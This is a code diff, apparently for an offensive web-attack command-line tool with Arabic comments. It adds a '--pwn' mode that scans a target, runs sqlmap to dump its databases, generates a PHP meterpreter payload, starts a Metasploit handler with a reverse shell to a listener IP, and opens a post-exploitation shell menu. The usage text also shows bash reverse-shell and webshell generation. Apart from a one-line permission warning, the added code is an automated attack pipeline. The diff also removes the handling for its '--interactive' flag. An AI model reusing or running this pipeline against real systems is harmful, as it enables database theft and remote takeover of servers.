@@ -378,16 +378,20 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 أمثلة:
-  %(prog)s --interactive                    # قائمة تفاعلية
-  %(prog)s https://target.com               # فحص متوسط
-  %(prog)s https://target.com --depth=deep  # فحص عميق
-  %(prog)s https://target.com --skip-port   # بدون فحص بورتات
+  %(prog)s https://target.com --pwn                    # هجوم شامل أوتوماتيكي (sqlmap + metasploit)
+  %(prog)s https://target.com --pwn --listener-ip IP   # مع metasploit reverse shell
+  %(prog)s --interactive                                # قائمة تفاعلية
+  %(prog)s https://target.com                           # فحص متوسط
+  %(prog)s https://target.com --depth=deep             # فحص عميق
+  %(prog)s https://target.com --skip-port              # بدون فحص بورتات
   %(prog)s --reverse bash --ip 10.0.0.1 --port 4444
   %(prog)s --webshell php --output shell.php
-  %(prog)s --list-reverse                   # عرض كل الـ reverse shells
+  %(prog)s --list-reverse                               # عرض كل الـ reverse shells
 """
     )
     parser.add_argument("url", nargs="?", help="Target URL")
+    parser.add_argument("--pwn", action="store_true",
+                       help="Full automated attack: scan + exploit + sqlmap + metasploit + post-exploit")
     parser.add_argument("--interactive", "-i", action="store_true", help="Interactive TUI menu")
     parser.add_argument("--wizard", "-w", action="store_true", help="Interactive wizard (guided)")
     parser.add_argument("--auto", action="store_true",
@@ -504,16 +508,124 @@ def main():
 
     # Wizard mode (new default)
     if args.wizard or (not args.url and not args.auto and not args.full
-                       and not args.interactive and not args.list_reverse
-                       and not args.list_web and not args.reverse
-                       and not args.webshell and not args.all_reverse):
+                       and not args.pwn and not args.interactive
+                       and not args.list_reverse and not args.list_web
+                       and not args.reverse and not args.webshell
+                       and not args.all_reverse):
         wizard = Wizard()
         wizard.main_menu()
         return
 
-    # Interactive mode (old TUI)
-    if args.interactive:
-        interactive_menu()
+    # --pwn mode: Full automated attack with sqlmap + metasploit
+    if args.pwn:
+        if not args.url:
+            log_error("--pwn يتطلب URL")
+            return
+        url = args.url
+        if not url.startswith("http"):
+            url = "http://" + url
+
+        log_phase("🔥 العملية الشاملة (--pwn)")
+        log_info(f"الهدف: {url}")
+        log_warn("⚠️  استخدم فقط على مواقع لديك إذن بفحصها!")
+        print()
+
+        # استيراد الـ modules
+        from modules.full_auto import FullAutoScanner
+        from modules.sqlmap_integration import SQLmapIntegration
+        from modules.metasploit_integration import MetasploitIntegration
+        from modules.post_exploit_menu import PostExploitMenu
+
+        # Phase 1: الفحص الشامل
+        log_phase("Phase 1: الفحص الشامل")
+        options = {
+            "depth": args.depth,
+            "threads": args.threads,
+            "timeout": args.timeout,
+            "proxy": args.proxy,
+            "cookie": args.cookie,
+            "user_agent": args.user_agent,
+            "output": args.output,
+            "auto_exploit": True,
+            "listener_ip": args.listener_ip,
+            "listener_port": args.listener_port,
+        }
+
+        scanner = FullAutoScanner(url, options)
+        scan_result = scanner.run()
+
+        print(f"\n{Colors.GREEN}[✓] اكتمل الفحص{Colors.NC}")
+        print(f"  الثغرات: {scan_result.get('vulns_count', 0)}")
+
+        # Phase 2: sqlmap (لو فيه SQLi)
+        sqli_vulns = [v for v in scanner.all_vulns if "sql_injection" in v.get("type", "")]
+        if sqli_vulns:
+            log_phase("Phase 2: استغلال SQLi بـ sqlmap")
+
+            sqlmap = SQLmapIntegration()
+            if sqlmap.is_available():
+                # استخدام أول ثغرة SQLi
+                sqli_url = sqli_vulns[0].get("url", url)
+                log_info(f"استغلال: {sqli_url}")
+
+                # استغلال كامل
+                sqlmap_results = sqlmap.full_exploit(sqli_url)
+                sqlmap.print_results()
+
+                # حفظ النتائج
+                if sqlmap_results.get("dumped_data"):
+                    log_success("تم استخراج بيانات من قاعدة البيانات!")
+            else:
+                log_warn("sqlmap غير متاح - تخطي")
+
+        # Phase 3: Metasploit (لو فيه RCE أو listener IP)
+        rce_vulns = [v for v in scanner.all_vulns
+                     if v.get("type") in ["command_injection", "ssti", "file_upload"]
+                     or "rce" in v.get("type", "")]
+
+        if args.listener_ip and (rce_vulns or scan_result.get("shell_obtained")):
+            log_phase("Phase 3: Metasploit exploitation")
+
+            msf = MetasploitIntegration()
+            if msf.is_available():
+                # توليد payload
+                log_info("توليد meterpreter payload...")
+                payload_file = msf.generate_php_meterpreter(
+                    args.listener_ip, args.listener_port
+                )
+
+                if payload_file:
+                    log_success(f"Payload: {payload_file}")
+                    log_info("ارفع الـ payload على السيرفر المستهدف")
+
+                # بدء handler
+                log_info("بدء Metasploit handler...")
+                msf.start_handler(args.listener_ip, args.listener_port)
+
+                # محاولة exploitation
+                msf_result = msf.exploit_web_app(url, args.listener_ip, args.listener_port)
+                msf.print_results()
+            else:
+                log_warn("Metasploit غير متاح - تخطي")
+
+        # Phase 4: ما بعد الاختراق
+        if scan_result.get("shell_obtained") and scanner.shell_url:
+            log_phase("Phase 4: ما بعد الاختراق")
+            log_info("فتح قائمة التحكم...")
+
+            menu = PostExploitMenu(scanner.client)
+            menu.set_shell(scanner.shell_url)
+            menu.show_menu()
+
+        # تقرير نهائي
+        log_phase("📊 التقرير النهائي")
+        print(f"  {Colors.BOLD}الهدف:{Colors.NC} {url}")
+        print(f"  {Colors.BOLD}الثغرات:{Colors.NC} {scan_result.get('vulns_count', 0)}")
+        print(f"  {Colors.BOLD}Shell:{Colors.NC} {'✓' if scan_result.get('shell_obtained') else '✗'}")
+        if scan_result.get("reports"):
+            print(f"  {Colors.BOLD}التقرير:{Colors.NC} {scan_result['reports'].get('html', '')}")
+        print()
+
         return
 
     # Profile mode
